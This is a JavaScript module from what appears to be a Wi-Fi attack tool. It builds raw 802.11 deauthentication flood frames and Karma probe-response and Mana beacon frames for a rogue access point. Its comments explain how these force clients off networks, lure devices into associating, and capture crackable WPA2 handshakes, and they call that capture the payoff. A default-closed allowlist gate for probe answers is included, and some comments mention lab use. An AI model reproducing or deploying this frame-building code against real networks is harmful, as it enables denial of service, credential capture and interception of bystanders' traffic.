// attack.js — stage 4. Builds the frames the radio transmits.
//
// The firmware stays a dumb transmitter: it takes bytes and puts them on the
// air. The frame is built here, where it can be tested against tshark on the
// bench without a radio ever being involved. That is not fussiness — building
// it here is what caught the reason-code byte order below, which the reference
// implementation gets wrong.
//
// Pure function of its arguments: no transport, no DOM, no device.

/** Deauthentication management subtype. */
export const SUBTYPE_DEAUTH = 0x0c;

/**
 * Reason codes worth being able to name. The first octet of the frame control
 * gets `(subtype << 4)`, so a deauth is 0xC0 on the wire.
 *
 * 7 is the classic choice for a deauth flood: the AP "received a Class 3 frame
 * from a nonassociated station", which is exactly what a client believes it is
 * seeing. 1 (unspecified) is the blunt alternative.
 */
export const REASON = {
  1: 'Unspecified',
  2: 'Previous authentication no longer valid',
  3: 'Sending STA is leaving',
  4: 'Disassociated due to inactivity',
  5: 'AP unable to handle all associated STAs',
  6: 'Class 2 frame from nonauthenticated STA',
  7: 'Class 3 frame from nonassociated STA',
  8: 'Sending STA is leaving the BSS',
  9: 'STA not authenticated with responding STA',
  15: '4-Way Handshake timeout',
  16: 'Group Key Handshake timeout',
  23: 'IEEE 802.1X authentication failed',
};

const HEX2 = /^[0-9a-f]{2}$/i;

/** "aa:bb:cc:dd:ee:ff" -> Uint8Array(6). Throws on anything else. */
export function macToBytes(mac) {
  if (typeof mac !== 'string') throw new Error('mac must be a string');
  const parts = mac.trim().split(':');
  if (parts.length !== 6) throw new Error(`mac needs 6 octets: ${mac}`);
  const out = new Uint8Array(6);
  for (let i = 0; i < 6; i++) {
    if (!HEX2.test(parts[i])) throw new Error(`bad mac octet "${parts[i]}" in ${mac}`);
    out[i] = parseInt(parts[i], 16);
  }
  return out;
}

export function bytesToMac(b) {
  return Array.from(b).map((x) => x.toString(16).padStart(2, '0')).join(':');
}

export const BROADCAST = 'ff:ff:ff:ff:ff:ff';

/**
 * Build one 26-byte deauthentication frame.
 *
 * 24-byte 802.11 header + 2-byte reason code, and deliberately **no FCS** —
 * the radio adds it. Layout:
 *
 *   0      0xC0        frame control: mgmt (2<<2) | deauth (0x0c << 4)
 *   1      0x00        flags: DS bits clear, no retry/protected/order
 *   2-3    0x0000      duration
 *   4-9    client      addr1 = DA
 *   10-15  bssid       addr2 = SA
 *   16-21  bssid       addr3 = BSSID
 *   22-23  seq << 4    sequence control, little-endian
 *   24-25  reason      little-endian
 *
 * The DS bits are clear and all three addresses are present, which is the
 * relationship the analyzer depends on reading back — a deauth sent as
 * {toDS,fromDS} = {0,0} is a direct frame, so addr1 is the destination, addr2
 * the source and addr3 the BSSID.
 *
 * **The reason code is little-endian.** Every 802.11 fixed field is. The bug
 * this guards against: writing the reason to the high byte (byte 25) instead of
 * byte 24, which is what `NRSuite` does — tshark then reads the reason as
 * 0x0700, "Unknown", instead of 0x0007. Many APs ignore the reason so it goes
 * unnoticed in the field, which is exactly why it is worth a test.
 */
export function buildDeauth({ bssid, client = BROADCAST, reason = 7, seq = 1 } = {}) {
  const b = macToBytes(bssid);
  const c = macToBytes(client);
  if (!Number.isInteger(reason) || reason < 0 || reason > 255) {
    throw new Error(`reason must be 0..255, got ${reason}`);
  }
  if (!Number.isInteger(seq) || seq < 0 || seq > 0xfff) {
    throw new Error(`seq must be 0..4095, got ${seq}`);
  }

  const f = new Uint8Array(26);
  f[0] = 0xc0;                                   // mgmt, deauth
  f[1] = 0x00;                                   // no flags
  f[2] = 0x00; f[3] = 0x00;                      // duration
  f.set(c, 4);                                   // addr1  DA
  f.set(b, 10);                                  // addr2  SA
  f.set(b, 16);                                  // addr3  BSSID
  // `seq` is the sequence *number*; the low nibble is the fragment number, and
  // these frames are never fragmented, so it stays zero.
  const sc = (seq << 4) & 0xffff;
  f[22] = sc & 0xff;
  f[23] = (sc >> 8) & 0xff;
  f[24] = reason & 0xff;                         // little-endian: low byte first
  f[25] = 0x00;
  return f;
}

/**
 * A burst, with the sequence number stepping exactly as it does on the wire.
 *
 * The sequence control field holds a 12-bit sequence number in bits 4-15 and a
 * 4-bit fragment number in bits 0-3. The *number* increments by one per frame;
 * encoding it is what shifts it left by four. Increment the encoded word by 1
 * instead and the fragment nibble runs to 15 and wraps, which tshark reports as
 * fragmented frames.
 */
export function buildBurst({ bssid, client = BROADCAST, reason = 7, count = 150, seq = 1 } = {}) {
  if (!Number.isInteger(count) || count < 1 || count > 2000) {
    throw new Error(`count must be 1..2000, got ${count}`);
  }
  const frames = [];
  let s = seq;
  for (let i = 0; i < count; i++) {
    frames.push(buildDeauth({ bssid, client, reason, seq: s }));
    s = (s + 1) & 0xfff;
  }
  return frames;
}

// ────────────────────────────────────────────────────────────────────────────
// Karma and Mana — the probe-response and beacon halves.
//
// Both are 802.11 *management* frames of the same shape: a 24-byte header, a
// 12-byte fixed field block (timestamp, beacon interval, capability), then a run
// of tagged parameters. The only real differences are the subtype and who the
// addresses are:
//
//   probe response  addr1 = the station that asked   addr2 = addr3 = our BSSID
//   beacon          addr1 = broadcast                addr2 = addr3 = our BSSID
//
// Same two-stage split as the deauth: the firmware stays a dumb transmitter
// (TX_FRAME: bytes in, on the air) and the frame is built here, where tshark can
// judge it on the bench with no radio involved. Nothing in this file transmits.
//
// Layouts come from IEEE 802.11-2020 §9.3.3.10 (probe response) and §9.3.3.3
// (beacon), with the tagged parameter formats in §9.4.2. They are written from
// the standard, not from any reference implementation — see the licensing note
// in the project skill. Cite the clause, not someone's source file.
// ────────────────────────────────────────────────────────────────────────────

/** Probe response subtype 5; beacon subtype 8. Both are management (type 0). */
export const SUBTYPE_PROBE_RESPONSE = 0x05;
export const SUBTYPE_BEACON = 0x08;

/**
 * What we claim to be. This is a real fork, not a cosmetic flag.
 *
 *  'open'  Privacy bit clear, no RSN IE. A device that remembers an *open*
 *          network associates all the way and we have it on our AP. A device
 *          that remembers WPA2 sees the security mismatch and does not.
 *
 *  'wpa2'  Privacy bit set, RSN IE claiming PSK/CCMP. We cannot complete the
 *          handshake — we do not have the passphrase — so the client starts the
 *          four-way exchange and fails. What that buys is M1/M2 on the air,
 *          which is a crackable handshake. That is the payoff, not access.
 *
 * Claiming WPA2 is the default because it is the honest default: it is what
 * most remembered networks are, and it produces a handshake rather than
 * implying a connection we do not have.
 */
export const SECURITY = { OPEN: 'open', WPA2: 'wpa2' };

/** A beacon interval in TU (1 TU ≈ 1.024 ms). 100 is the near-universal 102.4 ms. */
export const DEFAULT_BEACON_INTERVAL = 100;

/**
 * Capability Information field (§9.4.1.4), little-endian.
 *
 * Only two bits are set deliberately: ESS (bit 0) because we are claiming to be
 * an infrastructure AP, and Privacy (bit 4) only when we claim a protected
 * network. Getting Privacy wrong makes the frame self-contradictory — a WPA2
 * RSN IE with Privacy clear is an AP that says "encrypted" and "open" at once,
 * and clients disagree about which to believe.
 */
export function capabilityInfo({ security = SECURITY.WPA2 } = {}) {
  let cap = 1 << 0;                                        // ESS
  if (security === SECURITY.WPA2) cap |= 1 << 4;           // Privacy
  return cap;
}

// ── tagged parameters (§9.4.2) ──────────────────────────────────────────────

export const TAG = { SSID: 0, SUPPORTED_RATES: 1, DS_PARAMETER: 3, RSN: 48, EXT_SUPPORTED_RATES: 50 };

/** One tagged parameter: id, length, body. */
function tag(id, body) {
  const b = new Uint8Array(2 + body.length);
  b[0] = id;
  b[1] = body.length;
  b.set(body, 2);
  return b;
}

/**
 * SSID (§9.4.2.2). The length is *bytes*, not characters — an emoji or accented
 * name is longer than it looks, and a 32-character non-ASCII name overflows the
 * limit and gets rejected by the standard's own cap.
 */
export function ssidTag(name) {
  if (typeof name !== 'string') throw new Error('ssid must be a string');
  const enc = new TextEncoder().encode(name);
  if (enc.length === 0) throw new Error('ssid must not be empty');
  if (enc.length > 32) throw new Error(`ssid must be at most 32 bytes, got ${enc.length}`);
  return tag(TAG.SSID, enc);
}

/** DS Parameter Set (§9.4.2.4) — carries the channel as a single octet. */
export function dsParameterTag(channel) {
  if (!Number.isInteger(channel) || channel < 1 || channel > 14) {
    throw new Error(`channel must be 1..14, got ${channel}`);
  }
  return tag(TAG.DS_PARAMETER, Uint8Array.of(channel));
}

// One Supported Rates IE holding eight rates with the four basic ones flagged
// (0x80 bit), then Extended Supported Rates for the rest. Real APs send it this
// way. Emitting two separate Supported Rates IEs also decodes fine, but it is
// not what an AP looks like — and the point of this frame is to be believed by
// a client that is paying attention, not merely to parse. Same lesson as the
// synthesised M2 that had to carry real key data to be filed correctly.
const RATES = Uint8Array.of(0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24);  // 1,2,5.5,11 basic + 6,9,12,18
const RATES_EXT = Uint8Array.of(0x30, 0x48, 0x60, 0x6c);                      // 24,36,48,54

/**
 * RSN Information Element (§9.4.2.24), the WPA2 "this is a PSK/CCMP network"
 * claim. Bytes are the RSNE body: version 1, group cipher CCMP, one pairwise
 * cipher CCMP, one AKM PSK, capabilities 0.
 *
 * OUI 00:0f:ac is the IEEE 802.11 vendor-specific OUI; 4 = CCMP, 2 = PSK.
 */
export function rsnTag() {
  const body = Uint8Array.of(
    0x01, 0x00,                                     // version = 1
    0x00, 0x0f, 0xac, 0x04,                         // group cipher  = CCMP
    0x01, 0x00, 0x00, 0x0f, 0xac, 0x04,             // pairwise count 1, CCMP
    0x01, 0x00, 0x00, 0x0f, 0xac, 0x02,             // AKM count 1, PSK
    0x00, 0x00,                                     // RSN capabilities
  );
  return tag(TAG.RSN, body);
}

/** The rate sets every real AP sends. Fixed values, not negotiated. */
function rateTags() {
  return [tag(TAG.SUPPORTED_RATES, RATES), tag(TAG.EXT_SUPPORTED_RATES, RATES_EXT)];
}

/** The tagged-parameter run both frame types share. */
export function informationElements({ ssid, channel, security = SECURITY.WPA2 }) {
  const parts = [ssidTag(ssid), ...rateTags()];
  if (security === SECURITY.WPA2) parts.push(rsnTag());
  parts.push(dsParameterTag(channel));
  return concat(parts);
}

function concat(parts) {
  const total = parts.reduce((n, p) => n + p.length, 0);
  const out = new Uint8Array(total);
  let at = 0;
  for (const p of parts) { out.set(p, at); at += p.length; }
  return out;
}

/** 24-byte management header. addr1/addr2/addr3 per §9.3.3.1 Table 9-28. */
function mgmtHeader({ subtype, da, bssid, seq }) {
  const d = macToBytes(da);
  const b = macToBytes(bssid);
  if (!Number.isInteger(seq) || seq < 0 || seq > 0xfff) {
    throw new Error(`seq must be 0..4095, got ${seq}`);
  }
  const h = new Uint8Array(24);
  h[0] = (subtype << 4) | 0x00;   // management (type 0), protocol version 0
  h[1] = 0x00;                    // no flags: DS bits clear, not protected
  h[2] = 0x00; h[3] = 0x00;       // duration
  h.set(d, 4);                    // addr1 = DA
  h.set(b, 10);                   // addr2 = SA/BSSID
  h.set(b, 16);                   // addr3 = BSSID
  // Sequence *number* in bits 4-15; this equals the encoded word, low byte first.
  const sc = (seq << 4) & 0xffff;
  h[22] = sc & 0xff;
  h[23] = (sc >> 8) & 0xff;
  return h;
}

/** The 12-byte fixed block: timestamp, beacon interval, capability. All LE. */
function fixedFields({ beaconInterval = DEFAULT_BEACON_INTERVAL, tsft = 0, security = SECURITY.WPA2 } = {}) {
  if (!Number.isInteger(beaconInterval) || beaconInterval < 0 || beaconInterval > 65535) {
    throw new Error(`beaconInterval must be 0..65535, got ${beaconInterval}`);
  }
  const f = new Uint8Array(12);
  const dv = new DataView(f.buffer);
  // Timestamp is the 8-byte TSF timer. Ours is a placeholder: a rogue AP's clock
  // is only meaningful to a client that has synced to it, and we are not trying
  // to be a time source — but the field must be present and 8 bytes wide.
  dv.setBigUint64(0, BigInt(tsft), true);
  dv.setUint16(8, beaconInterval, true);
  dv.setUint16(10, capabilityInfo({ security }), true);
  return f;
}

/**
 * A probe response answering `station`'s request for `ssid` — the Karma frame.
 *
 * `station` is the address the probe request came FROM, which is also the frame
 * request's addr2. It goes in addr1: a probe response is a direct frame to the
 * station that asked, not a broadcast.
 *
 * The BSSID is ours and is deliberately independent of the SSID — that is the
 * whole mechanism. We are claiming someone else's network name from an address
 * we chose, and there is no cryptographic tie between the two.
 */
export function buildProbeResponse({
  ssid, station, bssid, channel = 6, security = SECURITY.WPA2, seq = 1,
  beaconInterval = DEFAULT_BEACON_INTERVAL, tsft = 0,
} = {}) {
  if (typeof station !== 'string') throw new Error('station mac is required');
  const header = mgmtHeader({ subtype: SUBTYPE_PROBE_RESPONSE, da: station, bssid, seq });
  return concat([header, fixedFields({ beaconInterval, tsft, security }),
    informationElements({ ssid, channel, security })]);
}

/**
 * A beacon advertising `ssid` — the Mana frame.
 *
 * This is what covers devices that have stopped asking. Modern clients suppress
 * directed probes while the screen is off, so plain Karma has nothing to answer;
 * a beacon volunteers the name instead, and a device that recognises it connects
 * without having asked. addr1 is broadcast: a beacon is addressed to everyone.
 */
export function buildBeacon({
  ssid, bssid, channel = 6, security = SECURITY.WPA2, seq = 1,
  beaconInterval = DEFAULT_BEACON_INTERVAL, tsft = 0,
} = {}) {
  const header = mgmtHeader({ subtype: SUBTYPE_BEACON, da: BROADCAST, bssid, seq });
  return concat([header, fixedFields({ beaconInterval, tsft, security }),
    informationElements({ ssid, channel, security })]);
}

/** One beacon per name in `ssids`, sequence stepping across the whole run. */
export function buildBeaconPool({ ssids, bssid, channel = 6, security = SECURITY.WPA2,
                                 beaconInterval = DEFAULT_BEACON_INTERVAL, seq = 1 } = {}) {
  if (!Array.isArray(ssids) || ssids.length === 0) throw new Error('ssids must be a non-empty array');
  if (ssids.length > 64) throw new Error(`ssids is capped at 64, got ${ssids.length}`);
  let s = seq;
  const frames = [];
  for (const ssid of ssids) {
    frames.push(buildBeacon({ ssid, bssid, channel, security, seq: s, beaconInterval }));
    s = (s + 1) & 0xfff;
  }
  return frames;
}

/**
 * Which probe requests get an answer — the scoping gate.
 *
 * This is the design fork the project write-up says to settle *before* the
 * beacon TX exists, and it is settled here in the only direction that is safe
 * by default: **an empty allowlist answers nothing.** There is no wildcard and
 * no "answer everything" mode, because the thing being scoped is a rogue AP
 * that a stranger's device could associate to, and that is interception of
 * someone else's traffic. On our own devices or in a lab that is fine; applied
 * to whoever walks past, it is not. Defaulting closed means the failure mode of
 * a forgotten allowlist is "it did nothing", not "it did something to a
 * bystander".
 *
 * `probes` is an Analyze result's `probes` array: one entry per remembered name
 * a device asked for, with `ssid` and `stations`. Entries are matched by exact
 * SSID against the allowlist; a name that remembers no station is skipped,
 * because there is nobody to answer.
 *
 * Returns one directive per answerable probe. It builds no frames and touches no
 * transport, so it is a pure function and testable on the bench.
 */
export function scopedProbeTargets(probes, { allowlist = [] } = {}) {
  if (!Array.isArray(probes)) return [];
  if (!Array.isArray(allowlist) || allowlist.length === 0) return [];
  const allowed = new Set(allowlist);
  const out = [];
  const seen = new Set();
  for (const p of probes) {
    const ssid = p && p.ssid;
    if (typeof ssid !== 'string' || !ssid) continue;
    if (!allowed.has(ssid)) continue;
    const stations = Array.isArray(p.stations) ? p.stations : [];
    for (const st of stations) {
      const mac = typeof st === 'string' ? st : st && st.mac;
      // Never answer a group address. An addr1 with the I/G bit set is a
      // multicast destination and nothing is listening on it — and a station
      // list that contains one is a parsing bug upstream, not a client.
      if (typeof mac !== 'string') continue;
      let first;
      try { first = macToBytes(mac)[0]; } catch { continue; }
      if (first & 0x01) continue;
      const key = `${ssid}|${mac}`;
      if (seen.has(key)) continue;
      seen.add(key);
      out.push({ ssid, station: mac, kind: 'probe-response' });
    }
  }
  return out;
}
